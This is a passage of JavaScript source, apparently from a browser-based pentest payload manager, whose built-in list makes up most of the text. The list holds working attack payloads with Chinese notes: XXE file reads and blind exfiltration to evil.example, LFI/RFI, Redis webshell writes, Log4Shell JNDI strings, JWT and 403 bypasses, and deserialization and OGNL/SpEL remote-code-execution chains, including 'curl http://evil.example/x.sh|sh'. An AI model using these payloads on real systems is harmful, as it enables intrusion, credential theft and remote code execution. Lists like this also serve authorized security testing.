    p("XXE外部实体注入", "XXE读文件", "XXE 读取本地文件：Windows win.ini", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE读文件·PHP", "XXE 读取 PHP 源码：php://filter base64 编码，避免特殊字符破坏 XML", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE外部DTD", "XXE 外部 DTD：引用攻击者 DTD，便于组合任意实体与 OOB 数据外带", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.example/evil.dtd\">%xxe;]><foo>&send;</foo>"),
    p("XXE外部实体注入", "Blind XXE", "Blind XXE：参数实体先把文件编码，再通过外部 DTD 把内容拼到请求 URL", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % dtd SYSTEM \"http://evil.example/evil.dtd\">%dtd;]><foo>&send;</foo>"),
    p("XXE外部实体注入", "Blind XXE·DTD", "Blind XXE 外部 DTD 内容：把 %file 的内容拼接到 send 实体的 URL 中", "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://evil.example/?data=%file;'>\">%all;"),
    p("XXE外部实体注入", "XXE触发SSRF", "XXE 触发 SSRF：请求 AWS 元数据服务，读取实例角色信息", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE内网探测", "XXE 内网探测：请求内网 8080 端口，根据响应差异判断服务存活", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE协议利用", "XXE expect 协议：PHP expect 扩展开启时可直接执行命令", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "编码绕过", "XXE 编码绕过：UTF-16 声明绕过仅检查 UTF-8 关键字的 WAF", "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XInclude", "XInclude 注入：无法控制 DOCTYPE 时，用 xi:include 读取本地文件", "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"),
    p("XXE外部实体注入", "SVG XXE", "SVG 文件 XXE：上传/解析 SVG 时读取 /etc/passwd", "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"),
    p("XXE外部实体注入", "SOAP XXE", "SOAP 接口 XXE：在 SOAP Envelope 前注入 DOCTYPE 实体", "<?xml version=\"1.0\"?><!DOCTYPE soap [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"),
    p("XXE外部实体注入", "外部DTD引用", "XXE 外部 DTD：直接引用远程 DTD 文件，适用于实体定义被过滤时", "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://evil.example/test.dtd\"><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE读文件", "XXE 读取环境变量：/proc/self/environ 可能包含密钥与连接串", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE读文件", "XXE 读取 Windows hosts：确认内网域名映射", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE读源码", "XXE 读取 PHP 配置源码：base64 输出避免 XML 解析失败", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/config.php\">]><foo>&xxe;</foo>"),
    p("XXE外部实体注入", "XXE读文件", "XXE 读取 /etc/hosts：获取主机名与内网服务映射", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"),


    /* ---------- 9. 文件包含 ---------- */
    p("文件包含", "LFI", "本地文件包含：../../ 穿越读取 /etc/passwd", "?file=../../../../etc/passwd"),
    p("文件包含", "LFI", "本地文件包含：尝试读取 /etc/shadow（通常权限不足）", "?file=../../../../etc/shadow"),
    p("文件包含", "PHP伪协议", "PHP 伪协议：base64 读取 index.php 源码，避免直接执行", "?file=php://filter/convert.base64-encode/resource=index.php"),
    p("文件包含", "PHP伪协议", "PHP 伪协议：base64 读取 config.php，获取数据库账号密码", "?file=php://filter/read=convert.base64-encode/resource=config.php"),
    p("文件包含", "PHP伪协议", "PHP 伪协议：iconv 编码转换绕过部分关键字与内容检测", "?file=php://filter/convert.iconv.utf-8.utf-16/resource=index.php"),
    p("文件包含", "PHP伪协议", "PHP 伪协议：php://input 读取 POST Body，可执行 PHP 代码", "?file=php://input"),
    p("文件包含", "PHP伪协议", "PHP 伪协议：data:// base64 直接包含 PHP 代码", "?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"),
    p("文件包含", "PHP伪协议", "PHP 伪协议：data:// 明文包含，需 allow_url_include=On", "?file=data://text/plain,<?php phpinfo();?>"),
    p("文件包含", "Phar", "Phar 反序列化：phar:// 访问上传的图片/压缩包，触发反序列化", "?file=phar://upload/1.jpg/shell.php"),
    p("文件包含", "Zip", "Zip 伪协议：包含压缩包内 shell.php（需知道压缩包路径）", "?file=zip://upload/1.zip%23shell.php"),
    p("文件包含", "日志包含", "Apache 日志包含 GetShell：先把 PHP 代码写入访问日志，再包含日志文件", "?file=/var/log/apache2/access.log"),
    p("文件包含", "日志包含", "Nginx 日志包含 GetShell：包含 access.log 执行日志中的 PHP 代码", "?file=/var/log/nginx/access.log"),
    p("文件包含", "LFI", "利用 /proc/self/environ：先通过 User-Agent 写入 PHP 代码，再包含环境变量", "?file=/proc/self/environ"),
    p("文件包含", "LFI", "利用 /proc/self/fd：读取进程文件描述符内容（部分环境可回显）", "?file=/proc/self/fd/1"),
    p("文件包含", "LFI", "expect 协议：expect 扩展开启时直接执行命令", "?file=expect://id"),
    p("文件包含", "RFI", "远程文件包含：包含攻击者服务器上的 shell.txt（需 allow_url_include=On）", "?file=http://evil.example/shell.txt"),
    p("文件包含", "RFI", "远程文件包含+00截断：截断后续强制追加的 .php 后缀", "?file=http://evil.example/shell.txt%00"),
    p("文件包含", "过滤绕过", "文件包含过滤绕过：..././ 交替路径，绕过去除 ../ 的过滤器", "?file=..././..././..././etc/passwd"),
    p("文件包含", "00截断", "文件包含+00截断：截断后缀限制读取 /etc/passwd", "?file=/etc/passwd%00"),
    p("文件包含", "日志包含", "日志包含前置步骤：将 PHP 代码写入 User-Agent，随后包含访问日志", "<?php system($_GET['cmd']);?>"),

    /* ---------- 10. NoSQL注入 ---------- */
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$ne 绕过登录，匹配任意非空用户名与密码", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$gt 空字符串绕过登录校验", "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：PHP 数组参数形式注入 $ne 操作符", "username[$ne]=admin&password[$ne]=admin"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$regex 正则盲注，逐字符匹配管理员密码", "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$where JavaScript 条件注入，绕过普通查询", "{\"$where\":\"this.username == 'admin'\"}"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$where 中调用 sleep 验证 JavaScript 执行", "{\"$where\":\"sleep(5000)\"}"),
    p("NoSQL注入", "MongoDB", "MongoDB 字符串拼接注入：提前 return true 绕过认证逻辑", "';return true;var x='"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$in 枚举管理员用户名", "{\"username\":{\"$in\":[\"admin\",\"root\"]},\"password\":{\"$ne\":\"x\"}}"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$exists 判断密码字段是否存在", "{\"username\":\"admin\",\"password\":{\"$exists\":true}}"),
    p("NoSQL注入", "MongoDB", "MongoDB 字符串注入：使用逻辑或让查询恒真", "admin'||'1'=='1"),
    p("NoSQL注入", "MongoDB", "MongoDB 注入：$regex 精确匹配管理员用户名，配合盲注逐位猜解", "{\"username\":{\"$regex\":\"^admin$\"}}"),
    p("NoSQL注入", "Redis·未授权", "Redis 未授权：发送 PING 验证未授权访问与 RESP 协议可用性", "*1\\r\\n$4\\r\\nPING\\r\\n"),
    p("NoSQL注入", "Redis·写Webshell", "Redis 未授权写 Webshell：SET 内容后配合 CONFIG SET dir/dbfilename 保存", "SET shell \"<?php system($_GET['cmd']);?>\"\\r\\n"),
    p("NoSQL注入", "Redis·写Webshell", "Redis 未授权：修改持久化目录与文件名并 SAVE，落地 PHP 文件", "CONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename shell.php\\r\\nSAVE\\r\\n"),
    p("NoSQL注入", "Redis·命令", "Redis RESP 命令：SET key value 的基础请求格式", "*3\\r\\n$3\\r\\nSET\\r\\n$1\\r\\na\\r\\n$1\\r\\nb\\r\\n"),
    p("NoSQL注入", "Memcached", "Memcached 未授权：set 写入键值，验证端口暴露与写入权限", "set foo 0 0 3\\r\\nbar\\r\\n"),
    p("NoSQL注入", "Memcached", "Memcached 未授权：读取 items 统计信息，寻找缓存中的敏感键", "stats items\\r\\n"),
    p("NoSQL注入", "Memcached", "Memcached 未授权：flush_all 清空全部缓存，可造成业务缓存击穿", "flush_all\\r\\n"),

    /* ---------- 11. 其他注入 ---------- */
    p("其他注入", "LDAP注入", "LDAP 注入：闭合过滤条件并注入通配符，绕过登录认证", "*)(uid=*))(|(uid=*"),
    p("其他注入", "LDAP注入", "LDAP 注入：admin)(&) 构造恒真条件", "admin)(&)"),
    p("其他注入", "LDAP注入", "LDAP 注入：枚举所有拥有密码字段的账号", "*)(|(password=*))"),
    p("其他注入", "LDAP注入", "LDAP 注入：%00 截断后续过滤条件", "*))%00"),
    p("其他注入", "XPath注入", "XPath 注入：经典单引号闭合恒真条件，绕过登录", "' or '1'='1"),
    p("其他注入", "XPath注入", "XPath 注入：or 1=1 形式绕过节点条件", "' or 1=1 or ''='"),
    p("其他注入", "XPath注入", "XPath 注入：用 name() 判断当前节点名，进行盲注", "x' or name()='username' or 'x'='y"),
    p("其他注入", "XPath注入", "XPath 注入：使用 | 联合查询文档全部节点", "'] | //* | //*['"),
    p("其他注入", "CRLF注入", "CRLF 注入：在响应头中注入 Set-Cookie，实现会话固定", "%0d%0aSet-Cookie: admin=1"),
    p("其他注入", "CRLF注入", "CRLF 注入：注入 Location 响应头实现开放重定向", "%0d%0aLocation: https://evil.example/"),
    p("其他注入", "HTTP响应拆分", "HTTP 响应拆分：注入空行与第二个 HTTP 响应，污染后续请求", "foo%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK"),
    p("其他注入", "CRLF绕过", "Unicode CRLF 绕过：%E5%98%8A%E5%98%8D 在部分解码链中还原为 CRLF", "%E5%98%8A%E5%98%8D"),
    p("其他注入", "CRLF注入", "CRLF 注入原始形式：在参数中直接插入回车换行与自定义头", "\\r\\nX-Injected: true"),
    p("其他注入", "日志注入", "日志注入：写入换行与伪造访问日志行，污染日志分析结果", "admin\\n127.0.0.1 - - [21/Nov/2026:10:00:00 +0800] \"GET /admin HTTP/1.1\" 200"),
    p("其他注入", "日志注入", "日志注入：%0a 换行写入伪造的 INFO 日志，干扰审计", "%0a[INFO] user admin logged in"),
    p("其他注入", "日志注入·JNDI", "Log4j 日志注入：\x24{jndi:ldap://...} 触发 JNDI 远程类加载（Log4Shell）", "\x24{jndi:ldap://evil.example/a}"),
    p("其他注入", "日志注入·JNDI", "Log4j 日志注入：RMI 协议 JNDI 利用链", "\x24{jndi:rmi://evil.example/Exploit}"),
    p("其他注入", "日志注入·绕过", "Log4j 关键字绕过：使用 lower 查表拆分 jndi 关键字", "\x24{\x24{lower:j}ndi:ldap://evil.example/a}"),


    /* ---------- 12. 权限绕过与信息泄露 ---------- */
    p("权限绕过与信息泄露", "403绕过·路径", "403 权限绕过：..;/ 路径参数绕过 Spring/Tomcat 的路径鉴权", "/admin/..;/"),
    p("权限绕过与信息泄露", "403绕过·路径", "403 权限绕过：.;/ 分号伪路径，绕过基于目录的访问控制", "/admin/.;/"),
    p("权限绕过与信息泄露", "403绕过·编码", "403 权限绕过：%2e 编码点号，绕过路径规范化检查", "/admin/%2e/"),
    p("权限绕过与信息泄露", "403绕过·编码", "403 权限绕过：..%2f 编码斜杠，绕过 WAF 与鉴权规则", "/admin/..%2f"),
    p("权限绕过与信息泄露", "403绕过·路径", "403 权限绕过：前置 ./ 改变路径匹配结果", "/./admin"),
    p("权限绕过与信息泄露", "403绕过·路径", "403 权限绕过：双斜杠路径，部分容器/网关会归一化后放行", "//admin//"),
    p("权限绕过与信息泄露", "403绕过·路径", "403 权限绕过：末尾空格，利用网关与后端路径处理差异", "/admin%20"),
    p("权限绕过与信息泄露", "403绕过·路径", "403 权限绕过：末尾 /.，绕过只匹配 /admin 的规则", "/admin/."),
    p("权限绕过与信息泄露", "Header绕过", "403/IP 限制绕过：伪造 X-Forwarded-For 为本地地址", "X-Forwarded-For: 127.0.0.1"),
    p("权限绕过与信息泄露", "Header绕过", "403/内网限制绕过：伪造 X-Real-IP", "X-Real-IP: 127.0.0.1"),
    p("权限绕过与信息泄露", "Header绕过", "403/内网限制绕过：伪造 X-Originating-IP", "X-Originating-IP: 127.0.0.1"),
    p("权限绕过与信息泄露", "Header绕过", "403/虚拟主机绕过：伪造 X-Forwarded-Host 访问管理后台", "X-Forwarded-Host: 127.0.0.1"),
    p("权限绕过与信息泄露", "Header绕过", "403 路径重写绕过：通过 X-Rewrite-URL 直接指定 /admin", "X-Rewrite-URL: /admin"),
    p("权限绕过与信息泄露", "CORS绕过", "CORS 配置检测：修改 Origin 为攻击者域，观察是否回显允许", "Origin: https://evil.example"),
    p("权限绕过与信息泄露", "CORS绕过", "CORS 配置检测：Origin: null，适用于沙箱 iframe / 本地文件场景", "Origin: null"),
    p("权限绕过与信息泄露", "CORS绕过", "CORS 前缀匹配绕过：利用 target.example.evil.example 通过后缀校验缺陷", "https://target.example.evil.example"),
    p("权限绕过与信息泄露", "JWT测试", "JWT 测试：alg 改为 none，删除签名尝试空算法绕过", "{\"alg\":\"none\",\"typ\":\"JWT\"}"),
    p("权限绕过与信息泄露", "JWT测试", "JWT 测试：alg=none 的完整 token 示例（header.payload.空签名）", "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."),
    p("权限绕过与信息泄露", "JWT测试", "JWT kid 注入：kid 指向 /dev/null，使签名校验使用空密钥", "{\"kid\":\"../../../../dev/null\",\"alg\":\"HS256\"}"),
    p("权限绕过与信息泄露", "JWT测试", "JWT jku 注入：把 JWKS 地址指向攻击者服务器，伪造公钥", "{\"jku\":\"http://evil.example/jwks.json\",\"alg\":\"HS256\"}"),
    p("权限绕过与信息泄露", "开放重定向", "开放重定向：完整外部域名跳转，测试 redirect 参数是否校验", "?url=https://evil.example"),
    p("权限绕过与信息泄露", "开放重定向", "开放重定向：协议相对 URL //evil.example，绕过只校验 http(s) 的逻辑", "?url=//evil.example"),
    p("权限绕过与信息泄露", "开放重定向", "开放重定向：https:evil.example 省略斜杠，部分解析器仍会跳转", "?url=https:evil.example"),
    p("权限绕过与信息泄露", "开放重定向", "开放重定向：/\\evil.example 反斜杠变体，绕过对 // 的过滤", "?url=/\\evil.example"),
    p("权限绕过与信息泄露", "开放重定向", "开放重定向：userinfo 形式 target.example@evil.example 欺骗白名单", "?url=https://target.example@evil.example"),
    p("权限绕过与信息泄露", "CSRF测试", "CSRF 测试：自动提交表单修改管理员角色，验证是否存在 Token 校验", "<form id=\"f\" action=\"http://target.example/admin\" method=\"POST\"><input name=\"role\" value=\"admin\"></form><script>document.getElementById(\"f\").submit()</script>"),
    p("权限绕过与信息泄露", "CSRF测试", "CSRF 测试：GET 型删除接口，通过 img 标签静默发起请求", "<img src=\"http://target.example/admin/delete?id=1\">"),
    p("权限绕过与信息泄露", "点击劫持", "点击劫持：透明 iframe 覆盖目标页面，诱导用户点击敏感操作", "<iframe src=\"http://target.example/\" style=\"opacity:0.0001;position:absolute;inset:0;width:100%;height:100%\"></iframe>"),
    p("权限绕过与信息泄露", "点击劫持", "点击劫持：CSS 全屏透明 iframe，测试 X-Frame-Options/CSP 缺失", "<style>iframe{position:fixed;inset:0;opacity:0.01;z-index:9999}</style>"),

    /* ---------- 13. 反序列化 ---------- */
    p("反序列化", "PHP", "PHP 反序列化：最小 stdClass 对象，用于探测 unserialize 入口", "O:8:\"stdClass\":0:{}"),
    p("反序列化", "PHP", "PHP 反序列化：构造 User 对象并修改 admin 属性，测试属性注入", "O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:5:\"admin\";b:1;}"),
    p("反序列化", "PHP", "PHP 反序列化：数组结构示例，用于理解序列化格式", "a:2:{i:0;s:3:\"foo\";i:1;s:3:\"bar\";}"),
    p("反序列化", "PHP", "PHP 反序列化：POP 链占位对象，替换为实际类的属性即可触发 __destruct", "O:7:\"Exploit\":1:{s:3:\"cmd\";s:2:\"id\";}"),
    p("反序列化", "PHP·Wakeup绕过", "PHP __wakeup 绕过：属性数量大于实际属性数，触发 CVE-2016-7124", "O:4:\"Test\":3:{s:1:\"a\";s:1:\"b\";}"),
    p("反序列化", "PHP·Session", "PHP Session 反序列化：php| 前缀让 session 解码器执行对象反序列化", "php|O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}"),
    p("反序列化", "PHP·Phar", "Phar 反序列化：访问 phar:// 触发 meta-data 反序列化（无需 unserialize 点）", "phar://upload/1.jpg"),
    p("反序列化", "Java", "Java 反序列化：序列化流魔数 aced0005，用于识别 Java 序列化数据", "aced0005"),
    p("反序列化", "Java·ysoserial", "Java 反序列化：使用 ysoserial 生成 CommonsCollections5 利用链", "java -jar ysoserial.jar CommonsCollections5 \"calc\" | base64 -w0"),
    p("反序列化", "Java·JNDI", "Java 反序列化/JNDI：触发 LDAP 远程加载恶意类", "ldap://evil.example:1389/Exploit"),
    p("反序列化", "Java·JNDI", "Java 反序列化/JNDI：触发 RMI 远程加载恶意类", "rmi://evil.example:1099/Exploit"),
    p("反序列化", "Java·Fastjson", "Fastjson 反序列化：JdbcRowSetImpl + LDAP 触发 JNDI 注入", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil.example/Exploit\",\"autoCommit\":true}"),
    p("反序列化", "Java·Jackson", "Jackson 多态反序列化：开启 DefaultTyping 时的 JdbcRowSetImpl 利用链", "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://evil.example/Exploit\",\"autoCommit\":true}]"),
    p("反序列化", "Java·Shiro", "Shiro RememberMe 检测：发送 deleteMe 观察响应 Set-Cookie 是否包含 rememberMe", "rememberMe=deleteMe"),
    p("反序列化", "Python·Pickle", "Python pickle 反序列化：协议0 调用 os.system 执行 id", "cos\\nsystem\\n(S'id'\\ntR."),
    p("反序列化", "Python·YAML", "PyYAML 反序列化：!!python/object/apply 调用 os.system 执行命令", "!!python/object/apply:os.system [\"id\"]"),
    p("反序列化", "Python·YAML", "PyYAML 反序列化：!!python/object/new 调用 subprocess.check_output", "!!python/object/new:subprocess.check_output [[\"id\"]]"),
    p("反序列化", "Python·生成", "Python pickle 生成命令：把恶意对象序列化后 Base64 发送", "python3 -c \"import pickle,os,base64;print(base64.b64encode(pickle.dumps(os.system('id'))).decode())\""),

    /* ---------- 14. 表达式注入 ---------- */
    p("表达式注入", "EL", "EL 表达式注入：最基础的算术求值探测（7*7）", "\x24{7*7}"),
    p("表达式注入", "EL·RCE", "EL 表达式注入：反射获取 Runtime 执行 id（需方法调用未被禁用）", "\x24{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"),
    p("表达式注入", "EL", "EL 表达式注入：通过 pageContext 操作 Session，验证表达式上下文", "\x24{pageContext.request.getSession().setAttribute(\"admin\",\"1\")}"),
    p("表达式注入", "OGNL", "OGNL 表达式注入：Struts2 常见 %{7*7} 求值探测", "%{7*7}"),
    p("表达式注入", "OGNL·RCE", "OGNL 表达式注入：静态方法调用 Runtime.exec 执行 id", "%{@java.lang.Runtime@getRuntime().exec(\"id\")}"),
    p("表达式注入", "OGNL·RCE", "OGNL 表达式注入：ProcessBuilder 启动进程执行 id", "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"id\"})).start()}"),
    p("表达式注入", "OGNL·RCE", "OGNL 表达式注入：关闭方法访问限制后执行 Runtime.exec", "%{#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,@java.lang.Runtime@getRuntime().exec(\"id\")}"),
    p("表达式注入", "OGNL", "OGNL 表达式注入：使用 Scanner 读取命令执行结果", "%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('id').getInputStream()).next()}"),
    p("表达式注入", "OGNL·S2", "Struts2 OGNL：ProcessBuilder 构造命令数组并启动进程（S2 系列变体）", "%{#cmd=\"id\",#cmds={\"/bin/bash\",\"-c\",#cmd},#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start()}"),
    p("表达式注入", "SpEL", "SpEL 表达式注入：最基础的 #{7*7} 求值探测", "#{7*7}"),
    p("表达式注入", "SpEL·RCE", "SpEL 表达式注入：T() 调用 Runtime.exec 执行 id", "#{T(java.lang.Runtime).getRuntime().exec(\"id\")}"),
    p("表达式注入", "SpEL·RCE", "SpEL 表达式注入：\x24{} 占位符形式调用 Runtime.exec", "\x24{T(java.lang.Runtime).getRuntime().exec(\"id\")}"),
    p("表达式注入", "SpEL·RCE", "SpEL 表达式注入：String 数组传参执行 bash -c 远程脚本", "\x24{T(java.lang.Runtime).getRuntime().exec(new String[]{\"bash\",\"-c\",\"curl http://evil.example/x.sh|sh\"})}"),
    p("表达式注入", "SpEL", "SpEL 表达式注入：Scanner 读取命令执行结果并回显", "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}"),
    p("表达式注入", "SpEL·文件读取", "SpEL 表达式注入：Java NIO 读取 /etc/passwd", "\x24{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}"),
    p("表达式注入", "Thymeleaf", "Thymeleaf 预处理：__\x24{...}__::.x 触发 SpEL 求值执行命令", "__\x24{T(java.lang.Runtime).getRuntime().exec('id')}__::.x"),
    p("表达式注入", "Spring表达式", "Spring Cloud Function 注入：routing-expression 头触发 SpEL 求值", "spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec(\"id\")"),
    p("表达式注入", "JNDI", "JNDI 表达式注入：Log4Shell 经典 LDAP 远程类加载", "\x24{jndi:ldap://evil.example/a}"),
    p("表达式注入", "JNDI", "JNDI 表达式注入：RMI 协议远程类加载", "\x24{jndi:rmi://evil.example/Exploit}"),
    p("表达式注入", "MVEL", "MVEL 表达式注入：直接调用 Runtime.exec 执行命令", "Runtime.getRuntime().exec(\"id\")"),
    p("表达式注入", "Groovy", "Groovy 表达式注入：String.execute() 直接执行系统命令", "\x24{'id'.execute()}")
  ];


  /* ==================== 运行状态与DOM缓存 ==================== */
  var state = {
    tab: "payload",
    category: BUILTIN_CATEGORIES[0],
    search: "",
    data: { customCategories: [], customPayloads: [], favorites: [] },
    selectMode: false,
    selected: {},
    editingId: null,
    categoryMode: "new",
    renamingCategory: "",
    codec: "url",
    toastTimer: 0,
    confirmResolver: null
  };

  var els = {};
  var MODAL_IDS = ["payloadModal", "confirmModal", "categoryModal", "dataModal"];

  function cacheElements() {
    els.tabPayload = document.getElementById("tabPayload");
    els.tabEncode = document.getElementById("tabEncode");
    els.viewPayload = document.getElementById("viewPayload");
    els.viewEncode = document.getElementById("viewEncode");
    els.searchInput = document.getElementById("searchInput");
    els.clearSearchBtn = document.getElementById("clearSearchBtn");
    els.addPayloadBtn = document.getElementById("addPayloadBtn");
    els.dataBtn = document.getElementById("dataBtn");
    els.catNav = document.getElementById("catNav");
    els.categoryTitle = document.getElementById("categoryTitle");
    els.categoryCount = document.getElementById("categoryCount");
    els.batchBtn = document.getElementById("batchBtn");
    els.copyAllBtn = document.getElementById("copyAllBtn");
    els.selectBar = document.getElementById("selectBar");
    els.selectAllCheck = document.getElementById("selectAllCheck");
    els.selectedCount = document.getElementById("selectedCount");
    els.deleteSelectedBtn = document.getElementById("deleteSelectedBtn");
    els.exitSelectBtn = document.getElementById("exitSelectBtn");
    els.cardList = document.getElementById("cardList");
    els.overlay = document.getElementById("overlay");
    els.payloadModal = document.getElementById("payloadModal");
    els.payloadModalTitle = document.getElementById("payloadModalTitle");
    els.payloadForm = document.getElementById("payloadForm");
    els.payloadCategory = document.getElementById("payloadCategory");
    els.newCatField = document.getElementById("newCatField");
    els.newCategoryInput = document.getElementById("newCategoryInput");
    els.payloadDesc = document.getElementById("payloadDesc");
    els.payloadContent = document.getElementById("payloadContent");
    els.payloadError = document.getElementById("payloadError");
    els.confirmModal = document.getElementById("confirmModal");
    els.confirmTitle = document.getElementById("confirmTitle");
    els.confirmMessage = document.getElementById("confirmMessage");
    els.confirmCheckLine = document.getElementById("confirmCheckLine");
    els.confirmCheck = document.getElementById("confirmCheck");
    els.confirmCheckLabel = document.getElementById("confirmCheckLabel");
    els.confirmOkBtn = document.getElementById("confirmOkBtn");
    els.categoryModal = document.getElementById("categoryModal");
    els.categoryModalTitle = document.getElementById("categoryModalTitle");
    els.categoryForm = document.getElementById("categoryForm");
    els.categoryNameInput = document.getElementById("categoryNameInput");
    els.categoryError = document.getElementById("categoryError");
    els.dataModal = document.getElementById("dataModal");
    els.exportBtn = document.getElementById("exportBtn");
    els.importPickBtn = document.getElementById("importPickBtn");
    els.importFile = document.getElementById("importFile");
    els.dataError = document.getElementById("dataError");
    els.dataStats = document.getElementById("dataStats");
    els.codecBar = document.getElementById("codecBar");
    els.codecHint = document.getElementById("codecHint");
    els.encodeInput = document.getElementById("encodeInput");
    els.encodeOutput = document.getElementById("encodeOutput");
    els.encodeBtn = document.getElementById("encodeBtn");
    els.decodeBtn = document.getElementById("decodeBtn");
    els.clearEncodeBtn = document.getElementById("clearEncodeBtn");
    els.copyOutputBtn = document.getElementById("copyOutputBtn");
    els.toast = document.getElementById("toast");
  }

  /* ==================== 基础工具函数 ==================== */
  function isBuiltinCategory(name) {
    return BUILTIN_CATEGORIES.indexOf(name) !== -1;
  }

  function categoryExists(name) {
    return name === FAV_CAT || isBuiltinCategory(name) || state.data.customCategories.indexOf(name) !== -1;
  }

  function makeId() {
    return "c-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);
  }

  /** HTML转义（同时适用于文本与属性） */
  function esc(value) {
    return String(value == null ? "" : value).replace(/[&<>"']/g, function (ch) {
      if (ch === "&") return "&amp;";
      if (ch === "<") return "&lt;";
      if (ch === ">") return "&gt;";
      if (ch === "\"") return "&quot;";
      return "&#39;";
    });
  }

  /** 搜索关键字高亮：先切分原文再逐段转义，避免破坏标签 */
  function highlight(text, term) {
    text = String(text == null ? "" : text);
    if (!term) return esc(text);
    var lower = text.toLowerCase();
    var target = term.toLowerCase();
    var out = "";
    var from = 0;
    var idx;
    while ((idx = lower.indexOf(target, from)) !== -1) {
      out += esc(text.slice(from, idx));
      out += "<mark>" + esc(text.slice(idx, idx + target.length)) + "</mark>";
      from = idx + target.length;
    }
    out += esc(text.slice(from));
    return out;
  }

  function toast(message, type) {
    var el = els.toast;
    el.textContent = message;
    el.className = "toast show" + (type ? " " + type : "");
    clearTimeout(state.toastTimer);
    state.toastTimer = setTimeout(function () {
      el.className = "toast";
    }, 2200);
  }

  /* ==================== 本地数据存储 ==================== */
  function defaultData() {
    return { customCategories: [], customPayloads: [], favorites: [] };
  }

  /** 容错读取localStorage数据，过滤非法字段 */
  function sanitizeStoredData(raw) {
    var out = defaultData();
    if (!raw || typeof raw !== "object" || Array.isArray(raw)) return out;

    var cats = Array.isArray(raw.customCategories) ? raw.customCategories : [];
    cats.forEach(function (name) {
      if (typeof name !== "string") return;
      name = name.trim();
      if (!name || name === FAV_CAT || name === NEW_CAT_VALUE || isBuiltinCategory(name)) return;
      if (out.customCategories.indexOf(name) === -1) out.customCategories.push(name);
    });

    var usedIds = {};
    BUILTIN_PAYLOADS.forEach(function (item) { usedIds[item.id] = true; });

    var list = Array.isArray(raw.customPayloads) ? raw.customPayloads : [];
    list.forEach(function (item) {
      if (!item || typeof item !== "object" || Array.isArray(item)) return;
      var payload = typeof item.payload === "string" ? item.payload : "";
      if (!payload.trim()) return;
      var desc = typeof item.desc === "string" ? item.desc.trim() : "";
